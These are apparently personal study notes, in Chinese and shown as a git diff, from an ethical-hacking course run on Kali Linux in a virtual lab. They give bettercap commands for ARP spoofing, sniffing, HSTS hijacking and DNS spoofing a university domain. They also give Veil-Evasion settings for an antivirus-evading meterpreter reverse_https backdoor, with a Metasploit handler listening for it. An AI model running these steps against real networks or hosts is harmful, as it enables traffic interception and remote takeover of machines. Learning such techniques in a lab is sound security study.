@@ -1,4 +1,4 @@
-progress: 9-2
+progress: 12-1
 skip ch5~8 (因為需要wifi adapter)
 
 測試用網站: testhtml5.vulnweb.com
@@ -19,24 +19,24 @@ bettercap -iface <network interface>
   bettercap -iface eth0
 
 列出各種module及其狀態
-help
+>>help
 
 查詢特定module的用法
-help <module name>
+>>help <module name>
 
 啟動module
 <module name> on
-  arp.spoof on
+  >>arp.spoof on
 
 
 設定選項值
-set <option name> <value>
+>>set <option name> <value>
   set arp.spoof.fullduplex true
   set arp.spoof.targets 10.0.2.15
 
 
 監控target (同時跑net.recon net.probe arp.spoof)
-net.sniff on
+>>net.sniff on
 
 
 可以把bettercap的指令寫成腳本,副檔名叫cap
@@ -46,3 +46,72 @@ bettercap -iface eth0 -caplet <cap檔案>
   bettercap -iface eth0 -caplet spoof.cap
 
 
+把hstshijack.zip解壓縮後放到/usr/share/bettercap/caplets
+$unzip hstshijack.zip
+
+
+印出所有內建的腳本
+caplets.show
+
+
+啟動apache伺服器
+service apache2 start
+可用ifconfig查詢kali自己的ip,然後用瀏覽器連到那個ip,預設網頁的html在/var/www/html/index.html
+
+
+spoof網域名稱
+>>set dns.spoof.all true
+>>set dns.spoof.domains www.nthu.edu.tw
+>>dns.spoof on
+
+
+後門軟體Veil
+先去github下載到/opt,然後安裝必須的套件(可能要花一段時間,或安裝數次)
+$/opt/Veil/config/setup.sh --silent --force
+
+進入交互介面
+/opt/Veil/Veil.py
+
+印出可用工具
+>>list
+
+使用工具(1號工具:Evasion)
+>>use 1
+
+列出所有選項
+>>options
+
+
+(use 15:go/meterpreter/rev_https.py)
+設定選項值
+>>set [選項] [值]
+  set LHOST 10.0.2.7
+  set LPORT 8080
+  set SLEEP 6
+  set PROCESSORS 1
+
+產生後門軟體,可用nodistribute檢查是否被防毒擋下
+generate
+
+
+執行metasploit
+msfconsole
+
+使用metasploit模組
+>>use [module name]
+  use exploit/multi/handler
+
+印出選項
+>>show options
+
+修改選項值
+>>set [選項] [值]
+  set PAYLOAD windows/meterpreter/reverse_https
+  set LHOST 10.0.2.7
+  set LPORT 8080
+
+
+全部就緒後執行
+>>exploit
+
+可用kali內建的server傳後門軟體給其他VB
